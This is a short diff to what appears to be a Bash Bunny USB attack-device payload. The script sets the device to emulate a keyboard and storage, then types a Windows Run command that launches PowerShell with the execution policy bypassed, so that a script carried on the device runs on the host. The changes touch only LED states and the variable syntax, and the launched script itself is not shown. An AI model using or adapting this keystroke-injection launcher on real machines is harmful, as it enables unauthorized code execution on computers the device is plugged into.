@@ -1,12 +1,7 @@
-
-
-
-LED R B 100
+LED SETUP
+GET SWITCH_POSITION
 ATTACKMODE HID STORAGE
 
-
-DUCKY_LANG gb
-LED B
-RUN WIN powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
-LED G FAST
-#Green means good to go
+LED SETUP
+RUN WIN powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\run.ps1')"
+LED ATTACK
